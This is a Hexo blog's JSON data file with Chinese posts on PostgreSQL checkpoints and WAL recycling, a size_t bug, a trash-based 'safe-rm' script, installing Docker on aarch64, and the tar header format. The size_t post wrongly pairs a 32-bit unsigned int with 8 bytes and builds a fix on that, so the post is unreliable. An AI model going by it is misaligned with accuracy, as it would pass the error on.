{"meta":{"title":"Rocky_Ansi Blog","subtitle":"修己以清心为要,涉世以慎言为先!","description":"vagabond1132@gmail.com","author":"Rocky_Ansi","url":"http://rocky_ansi.gitee.io/vagabond1132_blog"},"pages":[{"title":"","date":"2018-12-13T14:16:37.247Z","updated":"2018-12-13T14:16:37.247Z","comments":true,"path":"manifest.json","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/manifest.json","excerpt":"","text":"{\"gcm_sender_id\":\"376695005133\"}"},{"title":"标签","date":"2018-01-14T04:24:44.000Z","updated":"2018-01-14T04:25:21.042Z","comments":true,"path":"tags/index.html","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/index.html","excerpt":"","text":""},{"title":"资源导航","date":"2017-07-08T04:04:56.000Z","updated":"2019-09-18T11:28:24.461Z","comments":true,"path":"resources/index.html","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/resources/index.html","excerpt":"","text":"资料 glibc Linux-kernel-org Linux-内核源码 C/C++参考手册 Linux基础学习 廖雪峰-Python3 PythonTab在线手册 Python在线手册 Git-在线手册 PostgreSQL 10.1 手册 GCC手册 陈皓-Makefile Linux-命令大全 NMap Packages Search Window Run lib Macos SoftWare 在线工具 在线工具 站长工具 Google翻译 博客 酷壳 廖雪峰 小马’s Blog 王垠 ctthuangcheng 网络资源 mp4pa电影 dianying 电影天堂 turnoff 极客漫画 kindle下载 skEbooks Kindle下载 我的小书屋 Kindle下载 鸠摩搜书 国内镜像 清华大学 清华大学Ipcv4 taobao npm镜像 网易开源镜像站 搜狐开源镜像站 北京交通大学 兰州大学 厦门大学 上海交通大学 中国科学技术大学 西南大学 MSDN, 我告诉你 代码编辑 Gvim notepad++ 代理vpn CordCloud-Vpn购买 Shadowsocksr 下载 本地配置 Linux-Vim配置-vimrc&amp;bundle下载可用 Window-Vim配置-vimrc下载可用 Everything Teamviewer Markdown工具 Navicat数据库连接 CCleaner iTerm2 Alfred Dash"},{"title":"转载其他文章","date":"2017-07-08T04:04:56.000Z","updated":"2018-11-21T10:41:37.026Z","comments":true,"path":"transfer/index.html","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/transfer/index.html","excerpt":"","text":"趣解Linux内核 Git &amp; Gitlab 使用及规范 Linux设备驱动归纳-chinaunix Linux 内核学习总结 如何调试Bash脚本 C/C++ extern关键字详解 Linux 网络编程-网络字节序、地址转换 编译Tslib步骤以及常见问题解决 一个故事讲完https 加密算法比较 C/C++ log日志库比较 关于Gitlab若干权限问题 linux bash shell之变量替换：:=句法、=句法、:-句法、-句法、=?句法、?句法、:+句法、+句法 虚拟化 - KVM 和 Xen 比较 如何成为一名黑客？ 我为什么不在乎人工智能 Top 实例讲解"}],"posts":[{"title":"Postgresql max_wal_size与Xlog file","slug":"PostgreSQL/2019-09-18-Postgresql-CheckPoint","date":"2019-09-18T12:27:32.000Z","updated":"2019-09-20T04:11:06.000Z","comments":true,"path":"2019/09/18/PostgreSQL/2019-09-18-Postgresql-CheckPoint/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/09/18/PostgreSQL/2019-09-18-Postgresql-CheckPoint/","excerpt":"​ Pg后台进程在执行用户事务时, 发生的数据更改是先写入缓冲池中, 对应PG就是shared buffers, PG缓冲池一般设置为内存的1/4左右， 缓冲池里边的这些数据修改,在事务提交时，无需同步到磁盘。 因为在事务提交时,会先写入WAL日志, 有wal日志存在,就可以在异常情况下将数据恢复, 保障数据库安全。因此数据本身是否在提交时写入磁盘将没有那么重要。Pg只是在需要时候, 例如脏页较多或者一定时间间隔后, 才将数据写回磁盘。 ​ checkPoint会触发刷新xlog日志页到磁盘. ​ checkPoint称之为检查点, 一般checkpoint会将某个时间之前的脏数据全部刷新到磁盘, 以实现数据的一致性与完整性。 CheckPointer进程解析 CheckPoint触发条件1234567891011121314151617181920/* * OR-able request flag bits for checkpoints. The \"cause\" bits are used only * for logging purposes. Note: the flags must be defined so that it's * sensible to OR together request flags arising from different requestors. * OR-able 请求检查点的标志位 *//* These directly affect the behavior of CreateCheckPoint and subsidiaries */#define CHECKPOINT_IS_SHUTDOWN 0x0001 /* Checkpoint is for shutdown */#define CHECKPOINT_END_OF_RECOVERY 0x0002 /* Like shutdown checkpoint, but * issued at end of WAL recovery */#define CHECKPOINT_IMMEDIATE 0x0004 /* Do it without delays */ //finish the checkpoint ASAP, ignoring checkpoint_completion_target_parameter#define CHECKPOINT_FORCE 0x0008 /* Force even if no activity */ //force a checkpoint even if no XLOG activity has occurred since the last one (implied by CHECKPOINT_IS_SHUTDOWN or CHECKPOINT_END_OF_RECOVERY)#define CHECKPOINT_FLUSH_ALL 0x0010 /* Flush all pages, including those * belonging to unlogged tables *//* These are important to RequestCheckpoint */#define CHECKPOINT_WAIT 0x0020 /* Wait for completion *//* These indicate the cause of a checkpoint request */#define CHECKPOINT_CAUSE_XLOG 0x0040 /* XLOG consumption */ // checkpoint is requested due to xlog filling. (This affects logging, and in particular enables CheckPointWarning.) #define CHECKPOINT_CAUSE_TIME 0x0080 /* Elapsed time */ 以上几种情况分别对应: 数据库shutdown操作 数据库recovery完成 管理员强制执行 checkpoint [CHECKPINT_FORCE] xlog日志量触发checkpoint阈值 周期进行checkpoint [ Elapsed time &gt;= CHeckPointTimeOut ] 需要刷新所有脏页 辅助性子进程checkpoint，会不断周期性检查以及xlog阈值是否达到. 而周期时间 与xlog日志量的阈值通过参数 max_wal_size 与 checkpoint_completion_target设置.","text":"​ Pg后台进程在执行用户事务时, 发生的数据更改是先写入缓冲池中, 对应PG就是shared buffers, PG缓冲池一般设置为内存的1/4左右， 缓冲池里边的这些数据修改,在事务提交时，无需同步到磁盘。 因为在事务提交时,会先写入WAL日志, 有wal日志存在,就可以在异常情况下将数据恢复, 保障数据库安全。因此数据本身是否在提交时写入磁盘将没有那么重要。Pg只是在需要时候, 例如脏页较多或者一定时间间隔后, 才将数据写回磁盘。 ​ checkPoint会触发刷新xlog日志页到磁盘. ​ checkPoint称之为检查点, 一般checkpoint会将某个时间之前的脏数据全部刷新到磁盘, 以实现数据的一致性与完整性。 CheckPointer进程解析 CheckPoint触发条件1234567891011121314151617181920/* * OR-able request flag bits for checkpoints. The \"cause\" bits are used only * for logging purposes. Note: the flags must be defined so that it's * sensible to OR together request flags arising from different requestors. * OR-able 请求检查点的标志位 *//* These directly affect the behavior of CreateCheckPoint and subsidiaries */#define CHECKPOINT_IS_SHUTDOWN 0x0001 /* Checkpoint is for shutdown */#define CHECKPOINT_END_OF_RECOVERY 0x0002 /* Like shutdown checkpoint, but * issued at end of WAL recovery */#define CHECKPOINT_IMMEDIATE 0x0004 /* Do it without delays */ //finish the checkpoint ASAP, ignoring checkpoint_completion_target_parameter#define CHECKPOINT_FORCE 0x0008 /* Force even if no activity */ //force a checkpoint even if no XLOG activity has occurred since the last one (implied by CHECKPOINT_IS_SHUTDOWN or CHECKPOINT_END_OF_RECOVERY)#define CHECKPOINT_FLUSH_ALL 0x0010 /* Flush all pages, including those * belonging to unlogged tables *//* These are important to RequestCheckpoint */#define CHECKPOINT_WAIT 0x0020 /* Wait for completion *//* These indicate the cause of a checkpoint request */#define CHECKPOINT_CAUSE_XLOG 0x0040 /* XLOG consumption */ // checkpoint is requested due to xlog filling. (This affects logging, and in particular enables CheckPointWarning.) #define CHECKPOINT_CAUSE_TIME 0x0080 /* Elapsed time */ 以上几种情况分别对应: 数据库shutdown操作 数据库recovery完成 管理员强制执行 checkpoint [CHECKPINT_FORCE] xlog日志量触发checkpoint阈值 周期进行checkpoint [ Elapsed time &gt;= CHeckPointTimeOut ] 需要刷新所有脏页 辅助性子进程checkpoint，会不断周期性检查以及xlog阈值是否达到. 而周期时间 与xlog日志量的阈值通过参数 max_wal_size 与 checkpoint_completion_target设置. CheckPoint相关参数 CheckPointSegments WAL File的数目. 由checkpoint_completion_target 与 max_wal_size 计算; checkpoint_timeout 系统自动执行checkpoint之间的最大时间间隔。系统默认值是5分钟。 checkpoint_completion_target 该参数表示checkpoint的完成时间占两次checkpoint时间间隔的比例，系统默认值是0.5,也就是说每个checkpoint需要在checkpoints间隔时间的50%内完成。 checkpoint_warning 系统默认值是30秒，如果checkpoints的实际发生间隔小于该参数，将会在server log中写入写入一条相关信息。可以通过设置为0禁用。 max_wal_size 与 wal segment file xlog.c 默认值. 判断wal file size; 根据以下参数计算; max_wal_size = 1GBmin_wal_size = 80MB GUC参数最大值. 最小值设置; 1if (newval-&gt;realval &lt; conf-&gt;min || newval-&gt;realval &gt; conf-&gt;max) checkpoint_completion_target 在检查点期间用于清空脏缓冲区的时间，作为检查点间隔的一部分 123456789&#123; &#123;\"checkpoint_completion_target\", PGC_SIGHUP, WAL_CHECKPOINTS, gettext_noop(\"Time spent flushing dirty buffers during checkpoint, as fraction of checkpoint interval.\"), NULL &#125;, &amp;CheckPointCompletionTarget, 0.5, 0.0, 1.0, NULL, NULL, NULL&#125;, checkpoint_completion_target 默认取值范围 (0, 1); max_wal_size 12345678910&#123; &#123;\"max_wal_size\", PGC_SIGHUP, WAL_CHECKPOINTS, gettext_noop(\"Sets the WAL size that triggers a checkpoint.\"), NULL, GUC_UNIT_MB &#125;, &amp;max_wal_size_mb, 64 * (XLOG_SEG_SIZE / (1024 * 1024)), 2, MAX_KILOBYTES, NULL, assign_max_wal_size, NULL&#125;, man_wal_size: ​ boot_val: 64 * (XLOG_SEG_SIZE / (1024 * 1024)) ​ 最小值: 2 ​ 最大值: MAX_KILOBYTES 12345#if SIZEOF_SIZE_T &gt; 4 &amp;&amp; SIZEOF_LONG &gt; 4#define MAX_KILOBYTES INT_MAX#else#define MAX_KILOBYTES (INT_MAX / 1024)#endif max_wal_size: assign_hook:assign_max_wal_size checkpoint 涉及最大段数: 计算方式 123456789101112131415161718192021222324252627282930/* * Max distance from last checkpoint, before triggering a new xlog-based * checkpoint. * 触发新的xlog检查点之前, 距离上一个检查点的最大距离; wal file size; */int CheckPointSegments;voidassign_max_wal_size(int newval, void *extra)&#123; max_wal_size_mb = newval; CalculateCheckpointSegments();&#125;static voidCalculateCheckpointSegments(void)&#123; double target; //CheckPointCompletionTarget 默认取值0.5 取值范围(0, 1); target = (double) ConvertToXSegs(max_wal_size_mb) / (2.0 + CheckPointCompletionTarget); CheckPointSegments = (int) target; if (CheckPointSegments &lt; 1) CheckPointSegments = 1;&#125;/* Convert min_wal_size_mb and max wal_size_mb to equivalent segment count */#define ConvertToXSegs(x) \\ (x / (XLOG_SEG_SIZE / (1024 * 1024))) 计算得知 CheckPointSegments 取值范围 (1, max_wal_size_mb * (1/3 - 1/2)); 关于 wal file size 以及 段文件替换 XLogFileInit 1234max_segno = logsegno + CheckPointSegments;if (!InstallXLogFileSegment(&amp;installed_segno, tmppath, *use_existent, max_segno, use_lock)) InstallXLogFileSegment Install a new XLOG segment file as a current or future log segment. 12345678910111213/* Find a free slot to put it in */while (stat(path, &amp;stat_buf) == 0)&#123; if ((*segno) &gt;= max_segno) &#123; /* Failed to find a free slot within specified range */ if (use_lock) LWLockRelease(ControlFileLock); return false; &#125; (*segno)++; XLogFilePath(path, ThisTimeLineID, *segno);&#125; 移除XLOG经常在做恢复的时候发现有的xlog file无法找到. 被覆盖使用. 那么 xlog文件什么时候删除? 删除多少，保留多少xlog文件? 都有哪些xlog文件需要保留? 需要首先估算两次checkpoint之间的xlog量。 计算最大的日志文件号 从而回收不需要的文件，并且进行重命名，提供即将使用的; 1234567891011121314151617181920212223242526272829303132333435363738/* * Update the estimate of distance between checkpoints. * * The estimate is used to calculate the number of WAL segments to keep * preallocated, see XLOGFileSlop(). */static voidUpdateCheckPointDistanceEstimate(uint64 nbytes)&#123; /* * To estimate the number of segments consumed between checkpoints, keep a * moving average of the amount of WAL generated in previous checkpoint * cycles. However, if the load is bursty, with quiet periods and busy * periods, we want to cater for the peak load. So instead of a plain * moving average, let the average decline slowly if the previous cycle * used less WAL than estimated, but bump it up immediately if it used * more. * * When checkpoints are triggered by max_wal_size, this should converge to * CheckpointSegments * XLOG_SEG_SIZE, * * Note: This doesn't pay any attention to what caused the checkpoint. * Checkpoints triggered manually with CHECKPOINT command, or by e.g. * starting a base backup, are counted the same as those created * automatically. The slow-decline will largely mask them out, if they are * not frequent. If they are frequent, it seems reasonable to count them * in as any others; if you issue a manual checkpoint every 5 minutes and * never let a timed checkpoint happen, it makes sense to base the * preallocation on that 5 minute interval rather than whatever * checkpoint_timeout is set to. */ PrevCheckPointDistance = nbytes; if (CheckPointDistanceEstimate &lt; nbytes) //更新估算量; CheckPointDistanceEstimate = nbytes; else CheckPointDistanceEstimate = (0.90 * CheckPointDistanceEstimate + 0.10 * (double) nbytes); &#125; 计算上一次checkpoint时所在的文件段号: 根据KeepLogSeg 确定保留的logSegNo 12345678910111213/* * Compute a segment number from an XLogRecPtr. * * For XLByteToSeg, do the computation at face value. For XLByteToPrevSeg, * a boundary byte is taken to be in the previous segment. This is suitable * for deciding which segment to write given a pointer to a record end, * for example. */#define XLByteToSeg(xlrp, logSegNo) \\ logSegNo = (xlrp) / XLogSegSize#define XLByteToPrevSeg(xlrp, logSegNo) \\ logSegNo = ((xlrp) - 1) / XLogSegSize KeepLogSeg 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* * Retreat *logSegNo to the last segment that we need to retain because of * either wal_keep_segments or replication slots. * * This is calculated by subtracting wal_keep_segments from the given xlog * location, recptr and by making sure that that result is below the * requirement of replication slots. */static voidKeepLogSeg(XLogRecPtr recptr, XLogSegNo *logSegNo)&#123; XLogSegNo segno; XLogRecPtr keep; XLByteToSeg(recptr, segno); keep = XLogGetReplicationSlotMinimumLSN(); //获取备机请求的lSN; 防止备机某些请求, 但删除了LOGSEG; /* compute limit for wal_keep_segments first */ if (wal_keep_segments &gt; 0) &#123; /* avoid underflow, don't go below 1 */ if (segno &lt;= wal_keep_segments) segno = 1; else segno = segno - wal_keep_segments; &#125; /* then check whether slots limit removal further */ if (max_replication_slots &gt; 0 &amp;&amp; keep != InvalidXLogRecPtr) &#123; XLogSegNo slotSegNo; XLByteToSeg(keep, slotSegNo); //获取备机请求的LSN所在LogSegNo; if (slotSegNo &lt;= 0) segno = 1; else if (slotSegNo &lt; segno) segno = slotSegNo; &#125; /* don't delete WAL segments newer than the calculated segment */ if (segno &lt; *logSegNo) *logSegNo = segno;&#125; RemoveXlogFile 利用得到的logsegno, 回收之前的wal file; 1234567891011121314151617181920212223242526272829303132333435XLogSegNo endlogSegNo;XLogSegNo recycleSegNo; /* * Initialize info about where to try to recycle to. */XLByteToSeg(endptr, endlogSegNo); //获取保留的文件段号;if (PriorRedoPtr == InvalidXLogRecPtr) recycleSegNo = endlogSegNo + 10;else recycleSegNo = XLOGfileslop(PriorRedoPtr); snprintf(path, MAXPGPATH, XLOGDIR \"/%s\", segname); /* * Before deleting the file, see if it can be recycled as a future log * segment. Only recycle normal files, pg_standby for example can create * symbolic links pointing to a separate archive directory. */if (endlogSegNo &lt;= recycleSegNo &amp;&amp; lstat(path, &amp;statbuf) == 0 &amp;&amp; S_ISREG(statbuf.st_mode) &amp;&amp; InstallXLogFileSegment(&amp;endlogSegNo, path, true, recycleSegNo, true)) //进行walfile的安装;&#123; ereport(DEBUG2, (errmsg(\"recycled write-ahead log file \\\"%s\\\"\", segname))); CheckpointStats.ckpt_segs_recycled++; /* Needn't recheck that slot on future iterations */ endlogSegNo++;&#125; .... XLogArchiveCleanup(segname); 关于回收recycleSegNo值; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/* * At a checkpoint, how many WAL segments to recycle as preallocated future * XLOG segments? Returns the highest segment that should be preallocated. */static XLogSegNoXLOGfileslop(XLogRecPtr PriorRedoPtr)&#123; XLogSegNo minSegNo; XLogSegNo maxSegNo; double distance; XLogSegNo recycleSegNo; /* * Calculate the segment numbers that min_wal_size_mb and max_wal_size_mb * correspond to. Always recycle enough segments to meet the minimum, and * remove enough segments to stay below the maximum. */ minSegNo = PriorRedoPtr / XLOG_SEG_SIZE + ConvertToXSegs(min_wal_size_mb) - 1; maxSegNo = PriorRedoPtr / XLOG_SEG_SIZE + ConvertToXSegs(max_wal_size_mb) - 1; /* * Between those limits, recycle enough segments to get us through to the * estimated end of next checkpoint. * * To estimate where the next checkpoint will finish, assume that the * system runs steadily consuming CheckPointDistanceEstimate bytes between * every checkpoint. * * The reason this calculation is done from the prior checkpoint, not the * one that just finished, is that this behaves better if some checkpoint * cycles are abnormally short, like if you perform a manual checkpoint * right after a timed one. The manual checkpoint will make almost a full * cycle's worth of WAL segments available for recycling, because the * segments from the prior's prior, fully-sized checkpoint cycle are no * longer needed. However, the next checkpoint will make only few segments * available for recycling, the ones generated between the timed * checkpoint and the manual one right after that. If at the manual * checkpoint we only retained enough segments to get us to the next timed * one, and removed the rest, then at the next checkpoint we would not * have enough segments around for recycling, to get us to the checkpoint * after that. Basing the calculations on the distance from the prior redo * pointer largely fixes that problem. */ //CheckPointCompletionTarget 默认取值 0.5 取值范围 (0, 1); //CheckPointDistanceEstimate 两次xlog之间的评估量; distance = (2.0 + CheckPointCompletionTarget) * CheckPointDistanceEstimate; /* add 10% for good measure. */ distance *= 1.10; recycleSegNo = (XLogSegNo) ceil(((double) PriorRedoPtr + distance) / XLOG_SEG_SIZE); if (recycleSegNo &lt; minSegNo) recycleSegNo = minSegNo; if (recycleSegNo &gt; maxSegNo) recycleSegNo = maxSegNo; return recycleSegNo;&#125;","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Debug size_t","slug":"Debug/2019-09-17-size_t问题","date":"2019-09-16T12:27:32.000Z","updated":"2019-09-18T12:16:25.768Z","comments":true,"path":"2019/09/16/Debug/2019-09-17-size_t问题/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/09/16/Debug/2019-09-17-size_t问题/","excerpt":"调试BUG时发现，以下问题: 由代码中发现 BYTES_INVALID 定义如下: 奇怪问题:在于file-&gt;write_size == -1; 但是if判断中却没有走到contine代码分支, 而是继续走到 validate.c 351行输出;","text":"调试BUG时发现，以下问题: 由代码中发现 BYTES_INVALID 定义如下: 奇怪问题:在于file-&gt;write_size == -1; 但是if判断中却没有走到contine代码分支, 而是继续走到 validate.c 351行输出; 关于数据结构定义如下: 123456789101112131415typedef struct pgFile&#123; time_t mtime; /* time of last modification */ mode_t mode; /* protection (file type and permission) */ size_t size; /* size of the file */ size_t read_size; /* size of the portion read (if only some pages are backed up partially, it's different from size) */ size_t write_size; /* size of the backed-up file. BYTES_INVALID means that the file existed but was not backed up because not modified since last backup. */ pg_crc32c crc; /* CRC value of the file, regular file only */ char *linked; /* path of the linked file */ bool is_datafile; /* true if the file is PostgreSQL data file */ char path[1]; /* path of the file */&#125; pgFile; 查看sizeof大小: 1sizeof(size_t) window: 8字节; linux: 8字节; cppreference.com size_t页面 ​ size_t 是 sizeof 、 _Alignof (C11 起) 和 offsetof 的结果的无符号整数类型，定义取决于数据模型。 size_t 定义如下: 1typedef unsigned int size_t; //8Byte Linux size_t 应该用 %u 标识, 即 -1 应该为 4294967295; 按照内存格式输出: 1printf(\"%u %d\", -1, -1); 输出为 14294967295 -1 即修改代码: 12345#ifdef WIN32#define BYTES_INVALID (4294967295)#else#define BYTES_INVALID (-1)#endi","categories":[{"name":"Debug","slug":"Debug","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Debug/"}],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"safe-rm","slug":"code/safe-rm","date":"2019-09-11T13:10:50.000Z","updated":"2019-09-18T12:17:42.874Z","comments":true,"path":"2019/09/11/code/safe-rm/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/09/11/code/safe-rm/","excerpt":"声明alias rm=&#39;safe-rm.sh&#39; 主要用于放置rm误删除操作. 建立隐藏文件夹[按日期建立]用于保存删除文件","text":"声明alias rm=&#39;safe-rm.sh&#39; 主要用于放置rm误删除操作. 建立隐藏文件夹[按日期建立]用于保存删除文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/bin/bash# 安全的rm脚本dir=$(date \"+%y_%m_%d\")#dir=\"/Users/rocky/.usertrash/$dir\"dir=\"/Users/rocky/.Trash/$dir\"#echo $dirif [ ! -d $dir ];then mkdir -p $dirfiis_f=falseargs=\"\"function f_remove() &#123; for i in $&#123;args&#125;; do if [ -d \"$i\" -o -f \"$i\" ];then name=`basename $i` if [ -d \"$dir/$name\" -o -f \"$dir/$name\" ];then new_name=\"$dir/$&#123;name&#125;_$(date '+%T')\" mv $i $new_name &amp;&amp; echo \"$i deleted,you can see in $new_name\" else mv $i $dir &amp;&amp; echo \"$i deleted,you can see in $dir/$i\" fi else echo \"参数错误\" fi done&#125;function remove() &#123; for j in $&#123;args&#125;; do if [ -d \"$j\" -o -f \"$j\" ];then name=`basename $j` #read -p \"Remove $name?[y/n]\" bool ## 是否开启删除提醒功能;l #if [ $bool == \"n\" ];then # exit #elif [ $bool == \"y\" ];then if [ -d \"$dir/$name\" -o -f \"$dir/$name\" ];then new_name=\"$dir/$&#123;name&#125;_$(date '+%T')\" mv $j $new_name &amp;&amp; echo \"$j deleted,you can see in $new_name\" else mv $j $dir &amp;&amp; echo \"$j deleted,you can see in $dir/$j\" fi #fi else echo \"参数错误\" fi done&#125;while [ \"$1\" ]; do case \"$1\" in -fr|-rf) is_f=true shift ;; -i) is_f=false shift ;; *) args=\"$1 $args\" shift ;; esacdoneif [[ $is_f = true ]];then f_removeelse removefi","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"飞腾 aarch64安装Docker","slug":"docker/2019-09-06-飞腾-aarch64-install-docker","date":"2019-09-06T11:18:29.000Z","updated":"2019-09-06T11:19:58.290Z","comments":true,"path":"2019/09/06/docker/2019-09-06-飞腾-aarch64-install-docker/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/09/06/docker/2019-09-06-飞腾-aarch64-install-docker/","excerpt":"设置中科大源: 123456789101112131415161718192021### 默认注释了源码仓库，如有需要可自行取消注释#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main restricted universe multiverse###备用;deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe","text":"设置中科大源: 123456789101112131415161718192021### 默认注释了源码仓库，如有需要可自行取消注释#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main restricted universe multiverse###备用;deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universedeb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universe#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe Docker 安装包下载 下载Docker-ce 1wget https://download.docker.com/linux/debian/dists/stretch/pool/stable/arm64/docker-ce_17.12.0~ce-0~debian_arm64.deb 123456789101112131415root@highgo-os:~# sudo dpkg -i docker-ce_17.12.1~ce-0~debian_arm64.deb (正在读取数据库 ... 系统当前共安装有 203362 个文件和目录。)正准备解包 docker-ce_17.12.1~ce-0~debian_arm64.deb ...正在将 docker-ce (17.12.1~ce-0~debian) 解包到 (17.12.1~ce-0~debian) 上 ...dpkg: 依赖关系问题使得 docker-ce 的配置工作不能继续： docker-ce 依赖于 libseccomp2 (&gt;= 2.3.0)；然而：系统中 libseccomp2:arm64 的版本为 2.2.3-3kord3。dpkg: 处理软件包 docker-ce (--install)时出错： 依赖关系问题 - 仍未被配置正在处理用于 ureadahead (0.100.0-19kord) 的触发器 ...正在处理用于 systemd (229-4kord4k5) 的触发器 ...正在处理用于 man-db (2.7.5-1kord) 的触发器 ...在处理时有错误发生： docker-ce 通过上述发现: libseccomp2的版本较低: 12345root@highgo-os:~# apt search libseccomp2正在排序... 完成全文搜索... 完成 libseccomp2/now 2.2.3-3kord3 arm64 [已安装，本地] high level interface to Linux seccomp filter 本身安装2.2.3 远低于依赖所需要的 2.3.0版本 下载所需lib依赖 dpkg -i libseccomp2_2.3.1-2.1ubuntu3_arm64.deb 再次安装Docker-ce 12345678root@highgo-os:~# dpkg -i docker-ce_17.12.1~ce-0~debian_arm64.deb (正在读取数据库 ... 系统当前共安装有 203362 个文件和目录。)正准备解包 docker-ce_17.12.1~ce-0~debian_arm64.deb ...正在将 docker-ce (17.12.1~ce-0~debian) 解包到 (17.12.1~ce-0~debian) 上 ...正在设置 docker-ce (17.12.1~ce-0~debian) ...正在处理用于 ureadahead (0.100.0-19kord) 的触发器 ...正在处理用于 systemd (229-4kord4k5) 的触发器 ...正在处理用于 man-db (2.7.5-1kord) 的触发器 ...","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"}]},{"title":"Linux tar 协议格式解析","slug":"PostgreSQL/2019-09-01-Linux-tar-协议格式-解析","date":"2019-08-28T11:58:05.000Z","updated":"2019-08-30T07:17:20.000Z","comments":true,"path":"2019/08/28/PostgreSQL/2019-09-01-Linux-tar-协议格式-解析/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/08/28/PostgreSQL/2019-09-01-Linux-tar-协议格式-解析/","excerpt":"Tar仅仅是归档文件, 用于多个文件合并. 并不进行压缩; 介绍Tar结构体 以及如何归档","text":"Tar仅仅是归档文件, 用于多个文件合并. 并不进行压缩; 介绍Tar结构体 以及如何归档 Tar归档文件组成归档单个文件tar -cf off.tar offpage.c Tar = 512Byte + file.st_size + padding; 归档多个文件Tar = 512Byte + file.st_size + padding * N [0-N]; 归档文件夹tar -cf dir.tar dir/ 归档文件夹: 512Byte(文件夹信息) + 文件归档 * N; Tar头部结构:1234567891011121314151617181920struct tar_header&#123; char name[100]; char mode[8]; char uid[8]; char gid[8]; char size[12]; char mtime[12]; //148byte char chksum[8]; char typeflag; //156byte char linkname[100]; char magic[6]; char version[2]; char uname[32]; char gname[32]; char devmajor[8]; char devminor[8]; char prefix[155]; char padding[12];&#125;; man tar.h可以查看更多信息; tarCreateHeader12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485inttarCheckSum(char *header)&#123; int i, sum; sum = 8 * ' '; for (i = 0 ; i &lt; 